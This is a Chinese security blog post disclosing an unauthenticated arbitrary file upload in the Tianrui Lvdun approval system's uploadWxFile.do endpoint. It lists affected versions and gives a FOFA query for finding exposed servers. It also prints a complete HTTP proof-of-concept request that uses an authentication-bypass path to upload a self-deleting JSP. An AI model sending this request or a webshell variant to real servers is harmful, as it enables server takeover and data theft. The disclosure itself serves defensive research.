---
title: "天锐绿盾审批系统 uploadWxFile.do 任意文件上传漏洞"
source: https://mrxn.net/jswz/trwfe-uploadWxFile-rce.html
asset_dir: assets/天锐绿盾审批系统-uploadwxfile.do-任意文件上传漏洞
---

# 天锐绿盾审批系统 uploadWxFile.do 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/11/11 08:26
- 602浏览
- [0评论](#comment)
- 10分钟阅读

深入探索

网络安全课程

编码转换工具

安全运维咨询

---

# 漏洞简介

天锐绿盾审批系统是一款专注于企业数据安全与合规管理的智能审批平台，深度融合了文档加密、权限管控与流程自动化等功能，旨在为企业提供从文件创建、流转到归档的全生命周期安全管控。

漏洞预警服务

该系统的 `/config/uploadWxFile.do` 接口存在任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞。 未经身份验证的攻击者可以利用此漏洞，通过向 `uploadWxFile.do` 接口上传恶意文件，例如Webshell，从而获取服务器的控制权限。

此漏洞可能导致攻击者完全控制目标服务器，进而造成企业敏感数据泄露、系统被篡改或进一步的网络攻击等严重安全风险。

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息

V3.53.240913

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"
>
> 安全研究工具

# 漏洞分析

先看`uploadWxFile.do`的实现

[![天锐绿盾审批系统 uploadWxFile.do 任意文件上传漏洞](images/img-001-4dde62405e3e.webp)](https://image.mrxn.net/1f1ee4dac2e34f2ea3bae0a926dc1eb1.webp)

上传的文件被带入`configService.uploadWxFileToRoot` 方法，跟进`configService.uploadWxFileToRoot`方法看下它的实现

深入探索

物流软件安全

Web安全课程

SQL

[![天锐绿盾审批系统 uploadWxFile.do 任意文件上传漏洞](images/img-002-17f8807234cc.webp)](https://image.mrxn.net/6dc9ad1d7dde424f966a5b25c23c59c1.webp)

全程对上传文件没有任何校验或者处理，直接保存到**webapps/ROOT**目录下，响应 **true**，代表上传成功，因此造成任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞。

# 漏洞复现

```
POST /trwfe/login.jsp/.%2e/config/uploadWxFile.do HTTP/1.1
Host: trwfe.mrxn.net
Content-Type: multipart/form-data; boundary=----123
Content-Length: 152

------123
Content-Disposition: form-data; name="file"; filename="1.jsp"

<%out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------123--
```

访问上传文件1.jsp

漏洞预警服务

[![天锐绿盾审批系统 uploadWxFile.do 任意文件上传漏洞](images/img-003-762226ae9b23.webp)](https://image.mrxn.net/238a81a58df74b97b783f45a9d3181b2.webp)

[成功执行](https://mrxn.net/tag/rce)打印随机uuid后，删除自身

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
